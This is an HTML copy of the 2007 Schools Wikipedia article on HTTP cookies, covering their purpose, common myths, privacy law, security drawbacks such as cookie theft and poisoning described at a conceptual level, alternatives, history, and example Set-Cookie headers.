<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
  <meta content="HTTP cookie,1996,2001,2002,2005,Advertising,Anonymity,Authentication,Belgium,Central Intelligence Agency,Common Gateway Interface" name="keywords" />
  <link href="../../favicon.ico" rel="shortcut icon" />
  <link href="../../wp/w/Wikipedia_Text_of_the_GNU_Free_Documentation_License.htm" rel="copyright" />
  <title>HTTP cookie</title>
  <style media="screen,projection" type="text/css">/*<![CDATA[*/ @import "../../css/wp-monobook-main.css"; /*]]>*/</style>
  <link href="../../css/wp-commonPrint.css" media="print" rel="stylesheet" type="text/css" />
  <!--[if lt IE 5.5000]><style type="text/css">@import "../../css/IE50Fixes.css";</style><![endif]-->
  <!--[if IE 5.5000]><style type="text/css">@import "../../css/IE55Fixes.css";</style><![endif]-->
  <!--[if IE 6]><style type="text/css">@import "../../css/IE60Fixes.css";</style><![endif]-->
  <!--[if IE 7]><style type="text/css">@import "../../css/IE70Fixes.css";</style><![endif]-->
  <!--[if lt IE 7]><script type="text/javascript" src="../../js/IEFixes.js"></script>
		<meta http-equiv="imagetoolbar" content="no" /><![endif]-->
  <script type="text/javascript">
			var skin = "monobook";
			var stylepath = "/skins-1.5";

			var wgArticlePath = "/wiki/$1";
			var wgScriptPath = "/w";
			var wgServer = "http://en.wikipedia.org";
                        
			var wgCanonicalNamespace = "";
			var wgNamespaceNumber = 0;
			var wgPageName = "HTTP_cookie";
			var wgTitle = "HTTP cookie";
			var wgArticleId = 5068415;
			var wgIsArticle = true;
                        
			var wgUserName = null;
			var wgUserLanguage = "en";
			var wgContentLanguage = "en";
		</script>
  <script src="../../js/wikibits.js" type="text/javascript"><!-- wikibits js --></script>
  <script src="../../js/wp.js" type="text/javascript"><!-- site js --></script>
  <style type="text/css">/*<![CDATA[*/
@import "../../css/wp-common.css";
@import "../../css/wp-monobook.css";
@import "../../css/wp.css";
/*]]>*/</style>
  <!-- Head Scripts -->
 </head>
 <body class="mediawiki ns-0 ltr page-HTTP_cookie">
  <div id="globalWrapper">
   <div id="column-content">
    <div id="content"><a id="top" name="top"></a><h1 class="firstHeading">HTTP cookie</h1>
     <div id="bodyContent">
      <h3 id="siteSub"><a href="../../index.htm">2007 Schools Wikipedia Selection</a>. Related subjects: <a href="../index/subject.IT.Websites_and_the_Internet.htm">Websites and the Internet</a></h3>
      <!-- start content -->
      <p><b>HTTP cookies</b>, sometimes known as <b>web cookies</b> or just <b>cookies</b>, are parcels of text sent by a <!--del_lnk--> server to a <a href="../../wp/w/World_Wide_Web.htm" title="World Wide Web">web</a> <!--del_lnk--> browser and then sent back unchanged by the browser each time it accesses that server. <!--del_lnk--> HTTP cookies are used for <!--del_lnk--> authenticating, tracking, and maintaining specific information about users, such as site preferences and the contents of their <!--del_lnk--> electronic shopping carts. The term &quot;cookie&quot; is derived from &quot;<!--del_lnk--> magic cookie,&quot; a well-known concept in Unix computing which inspired both the idea and the name of HTTP cookies.<p>Cookies have been of concern for <!--del_lnk--> Internet privacy, since they can be used for tracking browsing behaviour. As a result, they have been subject to legislation in various countries such as the <a href="../../wp/u/United_States.htm" title="United States">United States</a> and in the <a href="../../wp/e/European_Union.htm" title="European Union">European Union</a>. Cookies have also been criticised because the identification of users they provide is not always accurate and because they could potentially be used for network attacks. Some alternatives to cookies exist, but each has its own drawbacks.<p>Cookies are also subject to a number of misconceptions, mostly based on the erroneous notion that they are <!--del_lnk--> computer programs. In fact, cookies are simple pieces of data unable to perform any operation by themselves. In particular, they are neither <a href="../../wp/s/Spyware.htm" title="Spyware">spyware</a> nor <!--del_lnk--> viruses, despite the detection of cookies from certain sites by many anti-spyware products.<p>Most modern browsers allow users to decide whether to accept cookies, but rejection makes some <!--del_lnk--> websites unusable. For example, shopping baskets implemented using cookies do not work if cookies are rejected.<p>
       <script type="text/javascript">
//<![CDATA[
 if (window.showTocToggle) { var tocShowText = "show"; var tocHideText = "hide"; showTocToggle(); } 
//]]>
</script><a id="Purpose" name="Purpose"></a><h2> <span class="mw-headline">Purpose</span></h2>
      <p>Cookies are used by Web servers to differentiate users and to operate in a way that depends on the user. Cookies were invented for realising a virtual <!--del_lnk--> shopping basket: this is a virtual device in which the user can &quot;place&quot; items to purchase, so that users can navigate a site where items are shown, adding or removing items from the shopping basket at any time. Cookies allow for the content of the shopping cart to depend on the user&#39;s actions.<p>Allowing users to log in to a website is another use of cookies. Users typically log in by inserting their credentials into a login page; cookies allow the server to know that the user is already authenticated, and therefore is allowed to access services or perform operations that are restricted to logged-in users.<p>Several websites also use cookies for <!--del_lnk--> personalization based on users&#39; preferences. Sites that require authentication often use this feature, although it is also present on sites not requiring authentication. Personalization includes presentation and functionality. For example, the <a href="../../wp/w/Wikipedia.htm" title="Wikipedia">Wikipedia</a> Web site allows authenticated users to choose the webpage <!--del_lnk--> skin they like best; the <a href="../../wp/g/Google.htm" title="Google">Google</a> search engine allows users (even non-registered ones) to decide how many search results per page they want to see.<p>Cookies are also used to track users across a website. Third-party cookies and <!--del_lnk--> Web bugs, explained below, also allow for tracking across multiple sites. Tracking within a site is typically done with the aim of producing usage statistics, while tracking across sites is typically used by advertising companies to produce anonymous user profiles, which are then used to target advertising (deciding which advertising image to show) based on the user profile.<p><a id="Realization" name="Realization"></a><h2> <span class="mw-headline">Realization</span></h2>
      <p>Technically, cookies are arbitrary pieces of data chosen by the <!--del_lnk--> Web server and sent to the browser. The browser returns them unchanged to the server, introducing a <!--del_lnk--> state (memory of previous events) into otherwise stateless HTTP transactions. Without cookies, each retrieval of a <!--del_lnk--> Web page or component of a Web page is an isolated event, mostly unrelated to all other views of the pages of the same site. By returning a cookie to a web server, the browser provides the server a means of connecting the current page view with prior page views. Other than being set by a web server, cookies can also be set by a <!--del_lnk--> script in a language such as <!--del_lnk--> JavaScript, if supported and enabled by the Web browser.<p>Cookie specifications suggest that browsers should support a minimal number of cookies or amount of memory for storing them. In particular, an internet browser is expected to be able to store at least 300 cookies of 4 kilobytes each, and at least 20 cookies per server or <!--del_lnk--> domain.<p>The cookie setter can specify a deletion date, in which case the cookie will be removed on that date. If the cookie setter does not specify a date, the cookie is removed once the user quits his browser. As a result, specifying a date is a way for making a cookie survive across sessions. For this reason, cookies with an expiration date are called <i>persistent</i>. As an example application, a shopping site can use persistent cookies to store the items users have placed in their basket. This way, if users quit their browser without making a purchase and return later, they don&#39;t have to find the products they previously placed in the shopping cart over again.<p><a id="Misconceptions" name="Misconceptions"></a><h2> <span class="mw-headline">Misconceptions</span></h2>
      <p>Since their introduction on the Internet, misconceptions about cookies have circulated on the Internet and in the media. In 2005, <!--del_lnk--> Jupiter Research published the results of a survey, according to which a consistent percentage of respondents believed some of the following claims:<ul>
       <li><i>Myth:</i> Cookies are like <!--del_lnk--> worms and <!--del_lnk--> viruses in that they can erase data from the user&#39;s hard disks;<li><i>Myth:</i> Cookies are a form of <a href="../../wp/s/Spyware.htm" title="Spyware">spyware</a> in that they can read personal information stored on the user&#39;s computer;<li><i>Myth:</i> Cookies generate <!--del_lnk--> popups;<li><i>Myth:</i> Cookies are used for <!--del_lnk--> spamming;<li><i>Myth:</i> Cookies are only used for <a href="../../wp/a/Advertising.htm" title="Advertising">advertising</a>.</ul>
      <p>Cookies are in fact only data, not program code: they cannot erase or read information from the user&#39;s computer. However, cookies allow for detecting the Web pages viewed by a user on a given site or set of sites. This information can be collected in a <i>profile</i> of the user. Such profiles are often anonymous, that is, they do not contain personal information of the user (name, address, etc.) More precisely, they cannot contain personal information unless the user has made it available to some sites. Even if anonymous, these profiles have been the subject of some privacy concerns.<p>According to the same survey, a large percentage of Internet users do not know how to delete cookies.<p><a id="Browser_settings" name="Browser_settings"></a><h2> <span class="mw-headline">Browser settings</span></h2>
      <p>Most modern browsers support cookies. However, a user can usually also choose whether cookies should be used or not. The following are common options: (1) cookies are never accepted, (2) the browser asks the user whether to accept every individual cookie, or (3) cookies are always accepted.<div class="thumb tright">
       <div style="width:202px;"><a class="internal" href="../../images/252/25282.png.htm" title="The Firefox Cookie Manager, showing the details of various cookies by domain"><img alt="The Firefox Cookie Manager, showing the details of various cookies by domain" height="172" longdesc="/wiki/Image:Firefox_Cookie_Manager.png" src="../../images/252/25282.png" width="200" /></a><div class="thumbcaption">
         <div class="magnify" style="float:right"><a class="internal" href="../../images/252/25282.png.htm" title="Enlarge"><img alt="Enlarge" height="11" src="../../images/0/1.png" width="15" /></a></div> The <!--del_lnk--> Firefox Cookie Manager, showing the details of various cookies by domain</div>
       </div>
      </div>
      <p>The browser may also include the possibility of better specifying which cookies have to be accepted or not. In particular, the user can typically choose one or more of the following options: reject cookies from specific domains; disallow third-party cookies (see below); accept cookies as non-persistent (expiring when the browser is closed); and allow a server to set cookies for a different domain. Additionally, browsers may also allow users to view and delete individual cookies.<p>Most browsers supporting JavaScript allow the user to see the cookies that are active with respect to a given page by typing <code>javascript:alert(&quot;Cookies: &quot;+document.cookie)</code> in the browser <!--del_lnk--> URL field. Some browsers incorporate a cookie manager for the user to see and selectively delete the cookies currently stored in the browser.<p>The <!--del_lnk--> P3P specification includes the possibility for a server to state a privacy policy, which specifies which kind of information it collects and for which purpose. These policies include (but are not limited to) the use of information gathered using cookies. According to the P3P specification, a browser can accept or reject cookies by comparing the privacy policy with the stored user preferences or ask the user, presenting them the privacy policy as declared by the server.<p><a id="Privacy_and_third-party_cookies" name="Privacy_and_third-party_cookies"></a><h2> <span class="mw-headline">Privacy and third-party cookies</span></h2>
      <p>Cookies have some important implications on the <!--del_lnk--> privacy and <!--del_lnk--> anonymity of Web users. While cookies are only sent to the server setting them or one in the same <!--del_lnk--> Internet domain, a Web page may contain images or other components stored on servers in other domains. Cookies that are set during retrieval of these components are called <i>third-party cookies</i>.<p>Advertising companies use third-party cookies to track a user across multiple sites. In particular, an advertising company can track a user across all pages where it has placed advertising images or <!--del_lnk--> Web bugs. Knowledge of the pages visited by a user allows the advertisement company to target advertisement to the user&#39;s presumed preferences.<p>The possibility of building a profile of users has been considered by some a potential privacy threat, even when the tracking is done on a single domain but especially when tracking is done across multiple domains using third-party cookies. For this reason, some countries have legislation about cookies.<p>The <a href="../../wp/u/United_States.htm" title="United States">United States</a> government has set strict rules on setting cookies in 2000 after it was disclosed that the White House <!--del_lnk--> drug policy office used cookies to track computer users viewing its online anti-drug advertising to see if they then visited sites about drug making and drug use. In 2002, privacy activist <!--del_lnk--> Daniel Brandt found that the <!--del_lnk--> CIA had been leaving persistent cookies on computers for ten years. When notified it was violating policy, CIA stated that these cookies were not intentionally set and stopped setting them. On <!--del_lnk--> December 25, <!--del_lnk--> 2005, Brandt discovered that the <!--del_lnk--> National Security Agency had been leaving two persistent cookies on visitors&#39; computers due to a software upgrade. After being informed, the National Security Agency immediately disabled the cookies.<p>The <!--del_lnk--> 2002 European Union telecommunication privacy Directive contains rules about the use of cookies. In particular, Article 5, Paragraph 3 of this directive mandates that storing data (like cookies) in a user&#39;s computer can only be done if: 1) the user is provided information about how this data is used; and 2) the user is given the possibility of denying this storing operation. However, this article also states that storing data that is necessary for technical reasons is exempted from this rule. This directive was expected to have been applied since October 2003, but a <!--del_lnk--> December 2004 report says (page 38) that this provision was not applied in practice, and that some member countries (<a href="../../wp/s/Slovakia.htm" title="Slovakia">Slovakia</a>, <a href="../../wp/l/Latvia.htm" title="Latvia">Latvia</a>, <a href="../../wp/g/Greece.htm" title="Greece">Greece</a>, <a href="../../wp/b/Belgium.htm" title="Belgium">Belgium</a>, and <a href="../../wp/l/Luxembourg.htm" title="Luxembourg">Luxembourg</a>) did not even transpose it. The same report suggests a thorough analysis of the situation in the Member States.<p><a id="Drawbacks_of_cookies" name="Drawbacks_of_cookies"></a><h2> <span class="mw-headline">Drawbacks of cookies</span></h2>
      <p>Besides privacy concerns, there are some other reasons why cookies have been opposed: they do not always accurately identify users, and they can be used for security attacks.<p><a id="Inaccurate_identification" name="Inaccurate_identification"></a><h3> <span class="mw-headline">Inaccurate identification</span></h3>
      <p>If more than one browser is used on a computer, each has a separate storage area for cookies. Hence cookies do not identify a person, but a combination of a user account, a computer, and a Web browser. Thus, anyone who uses multiple accounts, computers, or browsers has multiple sets of cookies.<p>Likewise, cookies do not differentiate between multiple users who share a computer and browser, if they do not use different <!--del_lnk--> user accounts.<p><a id="Cookie_theft" name="Cookie_theft"></a><h3> <span class="mw-headline">Cookie theft</span></h3>
      <div class="thumb tright">
       <div style="width:202px;"><a class="internal" href="../../images/252/25284.png.htm" title="A cookie can be stolen by another computer that is allowed reading from the network"><img alt="A cookie can be stolen by another computer that is allowed reading from the network" height="109" longdesc="/wiki/Image:Cookie-sniffing.svg" src="../../images/252/25284.png" width="200" /></a><div class="thumbcaption">
         <div class="magnify" style="float:right"><a class="internal" href="../../images/252/25284.png.htm" title="Enlarge"><img alt="Enlarge" height="11" src="../../images/0/1.png" width="15" /></a></div> A cookie can be stolen by another computer that is allowed reading from the network</div>
       </div>
      </div>
      <p>During normal operation, cookies are sent back and forth between a server (or a group of servers in the same domain) and the computer of the browsing user. Since cookies may contain sensitive information (user name, a token used for authentication, etc.), their values should not be accessible to other computers. Cookies theft is any process allowing an unauthorised party to receive a cookie.<p>Cookies sent on ordinary HTTP sessions are visible to all users who can listen in on the network using a <!--del_lnk--> packet sniffer. This problem can be overcome by using the <!--del_lnk--> https URI scheme, which invokes <!--del_lnk--> Transport Layer Security to encrypt the connection. Additionally, a cookie can be set with the secure flag, which makes it to be sent only over a secure channel, such as an SSL connections.<div class="thumb tright">
       <div style="width:202px;"><a class="internal" href="../../images/252/25285.png.htm" title="Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party."><img alt="Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party." height="109" longdesc="/wiki/Image:Cookie-theft.svg" src="../../images/252/25285.png" width="200" /></a><div class="thumbcaption">
         <div class="magnify" style="float:right"><a class="internal" href="../../images/252/25285.png.htm" title="Enlarge"><img alt="Enlarge" height="11" src="../../images/0/1.png" width="15" /></a></div> Cross-site scripting: a cookie that should be only exchanged between a server and a client is sent to another party.</div>
       </div>
      </div>
      <p>A different way to steal cookies is <!--del_lnk--> cross-site scripting, which makes the browser itself to send cookies to servers that should not receive them. Modern browsers allow execution of pieces of code retrieved from the server. If cookies are accessible during execution, their value may be communicated in some form to servers that should not access them. The process allowing an unauthorised party to receive a cookie is called <i>cookie theft</i>, and encryption does not help against this attack..<p>This possibility is typically exploited by attackers on sites that allow users to post <!--del_lnk--> HTML content. By embedding a suitable piece of code in an HTML post, an attacker may receive cookies of other users. Knowledge of these cookies can then be exploited by connecting to the same site using the stolen cookies, thus being recognised as the user whose cookies have been stolen. A way for preventing such attacks is by the HttpOnly flag; this is a Microsoft-specific option that makes a cookie inaccessible to client side script.<div class="thumb tright">
       <div style="width:202px;"><a class="internal" href="../../images/252/25286.png.htm" title="Cookie poisoning: an attacker sends a server an invalid cookie, possibly modifying a valid cookie it previously received from the server."><img alt="Cookie poisoning: an attacker sends a server an invalid cookie, possibly modifying a valid cookie it previously received from the server." height="109" longdesc="/wiki/Image:Cookie-poison.svg" src="../../images/252/25286.png" width="200" /></a><div class="thumbcaption">
         <div class="magnify" style="float:right"><a class="internal" href="../../images/252/25286.png.htm" title="Enlarge"><img alt="Enlarge" height="11" src="../../images/0/1.png" width="15" /></a></div> Cookie poisoning: an attacker sends a server an invalid cookie, possibly modifying a valid cookie it previously received from the server.</div>
       </div>
      </div>
      <p><a id="Cookie_poisoning" name="Cookie_poisoning"></a><h3> <span class="mw-headline">Cookie poisoning</span></h3>
      <p>While cookies are supposed to be stored and sent back to the server unchanged, an attacker may modify the value of cookies before sending them back to the server. If, for example, a cookie contains the total value a user has to pay for the items in their shopping basket, changing this value exposes the server to the risk of making the attacker pay less than the supposed price. The process of tampering with the value of cookies is called <i>cookie poisoning</i>, and is sometimes used after cookie theft to make an attack persistent.<div class="thumb tright">
       <div style="width:202px;"><a class="internal" href="../../images/252/25287.png.htm" title="In cross-site cooking, the attacker exploits a browser bug to send an invalid cookie to a server."><img alt="In cross-site cooking, the attacker exploits a browser bug to send an invalid cookie to a server." height="109" longdesc="/wiki/Image:Cookie-cooking.svg" src="../../images/252/25287.png" width="200" /></a><div class="thumbcaption">
         <div class="magnify" style="float:right"><a class="internal" href="../../images/252/25287.png.htm" title="Enlarge"><img alt="Enlarge" height="11" src="../../images/0/1.png" width="15" /></a></div> In cross-site cooking, the attacker exploits a browser bug to send an invalid cookie to a server.</div>
       </div>
      </div>
      <p>Most websites, however, only store a session identifier &mdash; a randomly generated unique number used to identify the user&#39;s session &mdash; in the cookie itself, while all the other information is stored on the server. In this case, the problem of cookie poisoning is largely eliminated.<p><a id="Cross-site_cooking" name="Cross-site_cooking"></a><h3> <span class="mw-headline">Cross-site cooking</span></h3>
      <p>Each site is supposed to have its own cookies, so a site like evil.net should not be able to alter or set cookies for another site, like good.net. <!--del_lnk--> Cross-site cooking vulnerabilities in web browsers allow malicious sites to break this rule. This is similar to cookie poisoning, but the attacker exploits non-malicious users with vulnerable browsers, instead of attacking the actual site directly. The goal of such attacks may be to perform <!--del_lnk--> session fixation.<p><a id="Alternatives_to_cookies" name="Alternatives_to_cookies"></a><h2> <span class="mw-headline">Alternatives to cookies</span></h2>
      <p>Some of the operations that can be realised using cookies can also be realised using other mechanisms. However, these alternatives to cookies have their own drawbacks, which make cookies usually preferred to them in practice. Most of the following alternatives allow for user tracking, even if not as reliably as cookies. As a result, privacy is an issue even if cookies are rejected by the browser or not set by the server.<p><a id="IP_address" name="IP_address"></a><h3> <span class="mw-headline">IP address</span></h3>
      <p>An unreliable technique for tracking users is based on storing the <!--del_lnk--> IP addresses of the computers requesting the pages. This technique has been available since the introduction of the World Wide Web, as downloading pages requires the server holding them to know the IP address of the computer running the browser or the <!--del_lnk--> proxy, if any is used. This information is available for the server to be stored regardless of whether cookies are used.<p>However, these addresses are typically less reliable in identifying a user than cookies because computers and proxies may be shared by several users, and the same computer may be assigned different Internet addresses in different work sessions (this is often the case for <!--del_lnk--> dial-up connections). The reliability of this technique can be improved by using another feature of the HTTP protocol: when a browser requests a page because the user has followed a link, the request that is sent to the server contains the URL of the page where the link is located. If the server stores these URLs, the path of page viewed by the user can be tracked more precisely. However, these traces are less reliable than the ones provided by cookies, as several users may access the same page from the same computer, <!--del_lnk--> NAT router, or proxy and then follow two different links. Moreover, this technique only allows tracking and cannot replace cookies in their other uses.<p>Tracking by IP address can be impossible with some systems that are used to retain <!--del_lnk--> Internet anonymity, such as <!--del_lnk--> Tor. With such systems, not only could one browser carry multiple addresses throughout a session, but multiple users could appear to be coming from the same IP address, thus making IP address use for tracking wholly unreliable.<p>Some major ISPs, including AOL, route all web traffic through a small number of proxies which makes this scheme particularly unworkable.<p><a id="URL_.28query_string.29" name="URL_.28query_string.29"></a><h3> <span class="mw-headline">URL (query string)</span></h3>
      <p>A more precise technique is based on embedding information into URLs. The <!--del_lnk--> query string part of the <!--del_lnk--> URL is the one that is typically used for this purpose, but other parts can be used as well. The <!--del_lnk--> PHP session mechanism uses this method if cookies are not enabled.<p>This method consists of the Web server appending query strings to the links of a Web page it holds when sending it to a browser. When the user follows a link, the browser returns the attached query string to the server.<p>Query strings used in this way and cookies are very similar, both being arbitrary pieces of information chosen by the server and sent back by the browser. However, there are some differences: since a query string is part of a URL, if that URL is later reused, the same attached piece of information is sent to the server. For example, if the preferences of a user are encoded in the query string of a URL and the user sends this URL to another user by <!--del_lnk--> e-mail, those preferences will be used for that other user as well.<p>Moreover, even if the same user accesses the same page two times, there is no guarantee that the same query string is used in both views. For example, if the same user arrives to the same page but coming from a page internal to the site the first time and from an external <!--del_lnk--> search engine the second time, the relative query strings are typically different while the cookies would be the same. For more details, see <!--del_lnk--> query string.<p>Other drawbacks of query strings are related to security: storing data that identifies a session in a query string enables or simplifies <!--del_lnk--> session fixation attacks, <!--del_lnk--> referer logging attacks and other <!--del_lnk--> security exploits. Transferring session identifiers as HTTP cookies is more secure.<p><a id="HTTP_authentication" name="HTTP_authentication"></a><h3> <span class="mw-headline">HTTP authentication</span></h3>
      <p>As for authentication, the HTTP protocol includes mechanisms, such as the <!--del_lnk--> digest access authentication, that allow access to a Web page only when the user has provided the correct username and password. Once these credentials are given, the browser stores and uses them also for accessing subsequent pages, without requiring the user to provide them again. From the point of view of the user, the effect is the same as if cookies were used: username and password are only requested once, and from that point on the user is given access to the site. In the background, the username and password combination is sent to the server in every browser request. This means that someone listening in on this traffic, can simply read this information and store for later use. Session tokens on the other hand, usually expire after not having been used for a while, and thus effectively become useless (i.e. they cannot be used to retrieve the session in which the user was logged-in).<h3> <span class="mw-headline">Client-Side Persistence</span></h3>
      <p>Some web browsers support a script-based persistence mechanism that allows the page to store information locally for later retrieval. Internet Explorer, for example, supports persisting information in the browser&#39;s history, in favorites, in an XML store, or directly within a Web page saved to disk.<p>If JavaScript is enabled, the <code>window.name</code> property of the object <code>window</code> can be used to persistently store data. This property remains unaltered across the loading and unloading of other web pages. This <!--del_lnk--> hack is little known, and has therefore not been considered a security risk. Additionally, <code>window.name</code> introduces browser compatibility issues, as <!--del_lnk--> Mozilla-based browsers such as <a href="../../wp/m/Mozilla_Firefox.htm" title="Mozilla Firefox">Mozilla Firefox</a> do not support JavaScript persistence using <code>window.name.</code><p><a id="History" name="History"></a><h2> <span class="mw-headline">History</span></h2>
      <p>The term &quot;HTTP cookie&quot; derives from &quot;<!--del_lnk--> magic cookie&quot;, a packet of data a program receives but only uses for sending it again, possibly to its origin, unchanged. Magic cookies were already used in computing when <!--del_lnk--> Lou Montulli had the idea of using them in Web communications in June 1994. At the time, he was an employee of <!--del_lnk--> Netscape Communications, which was developing an <!--del_lnk--> e-commerce application for a customer. Cookies provided a solution to the problem of reliably implementing a virtual shopping cart.<p>Together with John Giannandrea, Montulli wrote the initial Netscape cookie specification the same year. Version 0.9beta of Netscape, released on September 1994, supported cookies. The first actual use of cookies (out of the labs) was made for checking whether visitors to the Netscape Web site had already visited the site. Montulli and Giannandrea applied for a patent for the cookie technology in 1995; it was granted in 1998. Support for cookies was integrated in Internet Explorer in version 2, released in October 1995.<p>The introduction of cookies was not widely known to the public, at the time. In particular, cookies were accepted by default, and users were not notified of the presence of cookies. Some people were aware of the existence of cookies as early as the first quarter of 1995, but the general public learned about them after the <i><!--del_lnk--> Financial Times</i> published an article about them on <!--del_lnk--> February 12, <!--del_lnk--> 1996. In the same year, cookies received lot of media attention, especially because of potential privacy implications. Cookies were discussed in two <!--del_lnk--> U.S. <!--del_lnk--> Federal Trade Commission hearings in 1996 and 1997.<p>The development of the formal cookie specifications was already ongoing. In particular, the first discussions about a formal specification started in April 1995 on the <!--del_lnk--> www-talk mailing list. A special working group within the <!--del_lnk--> IETF was formed. Two alternative proposals for introducing a state in an HTTP transactions had been proposed by Brian Behlendorf and David Kristol, respectively, but the group, headed by Kristol himself, soon decided to use the Netscape specification as a starting point. On February 1996, the working group identified third-party cookies as a considerable privacy threat. The specification produced by the group was eventually published as <!--del_lnk--> RFC 2109 in February 1997. It specifies that third-party cookies were either not allowed at all, or at least not enabled by default.<p>At this time, advertising companies were already using third-party cookies. The recommendation about third-party cookies of RFC 2109 was not followed by Netscape and Internet Explorer. RFC 2109 was followed by <!--del_lnk--> RFC 2965 in October 2000.<p><a id="Implementation" name="Implementation"></a><h2> <span class="mw-headline">Implementation</span></h2>
      <p><a id="Setting_a_cookie" name="Setting_a_cookie"></a><h3> <span class="mw-headline">Setting a cookie</span></h3>
      <p>Transfer of Web pages follows the <!--del_lnk--> HyperText Transfer Protocol (HTTP). Regardless of cookies, browsers request a page from web servers by sending them a short text called <!--del_lnk--> HTTP request. For example, to access the page http://www.w3.org/index.html, browsers connect to the server www.w3.org sending it a request that looks like the following one:<table>
       <tr>
        <td>
        </td>
        <td>
         <div style="border: solid thin; padding: 0em 1em">
          <p><code>GET /index.html HTTP/1.1</code></div>
        </td>
        <td>
        </td>
       </tr>
       <tr>
        <td><b>browser</b></td>
        <td>
         <center>&rarr;</center>
        </td>
        <td><b>server</b></td>
       </tr>
      </table>
      <p>The server replies by sending the requested page preceded by a similar packet of text, called <!--del_lnk--> HTTP header. This packet may contain lines requesting the browser to store cookies:<table>
       <tr>
        <td>
        </td>
        <td>
         <div style="border: solid thin; padding: 0em 1em">
          <p><tt>HTTP/1.1 200 OK<br /> Content-type: text/html<br /><font color="green">Set-Cookie: name=value</font><br /> &nbsp;<br /> (content of page)</tt></div>
        </td>
        <td>
        </td>
       </tr>
       <tr>
        <td><b>browser</b></td>
        <td>
         <center>&larr;</center>
        </td>
        <td><b>server</b></td>
       </tr>
      </table>
      <p>The line <code>Set-cookie</code> is only sent if the server wishes the browser to store a cookie. Indeed, it is a request for the browser to store the string <code>name=value</code> and send it back in all future requests to the server. If the browser supports cookies and cookies are enabled, every subsequent page request to the same server contains the cookie. For example, the browser requests the page http://www.w3.org/spec.html by sending the server www.w3.org a request like the following:<table>
       <tr>
        <td>
        </td>
        <td>
         <div style="border: solid thin; padding: 0em 1em;">
          <p><tt>GET /spec.html HTTP/1.1<br /><font color="green">Cookie: name=value</font><br /> Accept: */*<br /> &nbsp;<br /></tt></div>
        </td>
        <td>
        </td>
       </tr>
       <tr>
        <td><b>browser</b></td>
        <td>
         <center>&rarr;</center>
        </td>
        <td><b>server</b></td>
       </tr>
      </table>
      <p>This is a request for another page from the same server, and differs from the first one above because it contains the string that the server has previously sent to the browser. This way, the server knows that this request is related to the previous one. The server answers by sending the requested page, possibly adding other cookies as well.<p>The value of a cookie can be modified by the server by sending a new <code>Set-Cookie: name=newvalue</code> line in response of a page request. The browser then replaces the old value with the new one.<p>The <code>Set-Cookie</code> line is typically not created by the HTTP server itself but by a <!--del_lnk--> CGI program. The HTTP server only sends the result of the program (a document preceded by the header containing the cookies) to the browser.<p>Cookies can also be set by JavaScript or similar scripts running within the browser. In JavaScript, the object <code>document.cookie</code> is used for this purpose. For example, the instruction <code>document.cookie = &quot;temperature=20&quot;</code> creates a cookie of name <code>temperature</code> and value <code>20</code>.<p><a id="Cookie_attributes" name="Cookie_attributes"></a><h3> <span class="mw-headline">Cookie attributes</span></h3>
      <p>Beside the name/value pair, a cookie may also contain an expiration date, a <!--del_lnk--> path, a <!--del_lnk--> domain name, and whether the cookie is intended only for <!--del_lnk--> encrypted connections. <!--del_lnk--> RFC 2109 also specifies that cookies must have a mandatory version number, but this is usually omitted. These pieces of data follow the <code>name=newvalue</code> pair and are separated by semicolons. For example, a cookie can be created by the server by sending a line <code>Set-Cookie: name=newvalue; expires=date; path=/; domain=.example.org</code>.<div class="thumb tright">
       <div style="width:202px;"><a class="internal" href="../../images/252/25288.png.htm" title="Example of an HTTP response from google.com, which sets a cookie with attributes."><img alt="Example of an HTTP response from google.com, which sets a cookie with attributes." height="101" longdesc="/wiki/Image:HTTP-Cookie-Google.png" src="../../images/252/25288.png" width="200" /></a><div class="thumbcaption">
         <div class="magnify" style="float:right"><a class="internal" href="../../images/252/25288.png.htm" title="Enlarge"><img alt="Enlarge" height="11" src="../../images/0/1.png" width="15" /></a></div> Example of an HTTP response from <a href="../../wp/g/Google.htm" title="Google">google.com</a>, which sets a cookie with attributes.</div>
       </div>
      </div>
      <p>The domain and path tell the browser that the cookie has to be sent back to the server when requesting URLs of a given domain and path. If not specified, they default to the domain and path of the object that was requested. As a result, the domain and path strings may tell the browser to send the cookie when it normally would not. For security reasons, the cookie is accepted only if the server is a member of the domain specified by the domain string.<p>Cookies are actually identified by the triple name/domain/path, not only the name (the original Netscape specification considers only the pair name/path). In other words, same name but different domains or paths identify different cookies with possibly different values. As a result, cookie values are changed only if a new value is given for the same name, domain, and path.<p>The expiration date tells the browser when to delete the cookie. If no expiration date is provided, the cookie is deleted at the end of the user session, that is, when the user quits the browser. As a result, specifying an expiration date is a means for making cookies to survive across browser sessions. For this reason, cookies that have an expiration date are called <i>persistent</i>.<p>The expiration date is specified in the &quot;Wdy, DD-Mon-YYYY HH:MM:SS <!--del_lnk--> GMT&quot; format. As an example, the following is a cookie sent by a Web server (the value string has been changed):<p><code>Set-Cookie: RMID=732423sdfs73242; expires=Fri, 31-Dec-2010 23:59:59 GMT; path=/; domain=.example.net</code><p>The name of this particular cookie is <code>RMID</code>, while its value is the string <code>732423sdfs73242</code>. The server can use an arbitrary string as the value of a cookie. The server may collapse the value of a number of variables in a single string, like for example <code>a=12&amp;b=abcd&amp;c=32</code>. The path and domain strings <code>/</code> and <code>.example.net</code> tell the browser to send the cookie when requesting an arbitrary page of the domain <code>.example.net</code>, with an arbitrary path.<p><a id="Expiration" name="Expiration"></a><h3> <span class="mw-headline">Expiration</span></h3>
      <p>Cookies expire, and are therefore not sent by the browser to the server, under these conditions:<ol>
       <li>At the end of the user session (i.e. when the browser is shut down) if the cookie is not persistent<li>An expiration date has been specified, and has passed<li>The expiration date of the cookie is changed (by the server or the script) to a date in the past<li>The browser deletes the cookie by user request</ol>
      <p>The third condition allows a server or script to explicitly delete a cookie.<p><a id="Authentication" name="Authentication"></a><h3> <span class="mw-headline">Authentication</span></h3>
      <p>Cookies can be used by a server to recognize authenticated users and to personalize the web pages of a site depending on the preferences of a user. This can be done for example as follows:<ol>
       <li>The user inserts username and password in the text fields of a login page and sends them to the server;<li>The server receives username and password and checks them; if correct, it sends back a page confirming that logging has been successful together with a cookie, storing the pair user/cookie (or just the cookie);<li>Every time the user requests a page from the server, the browser automatically sends the cookie back to the server; the server compares the cookie with the stored ones; if a match is found, the server knows which user has requested that page.</ol>
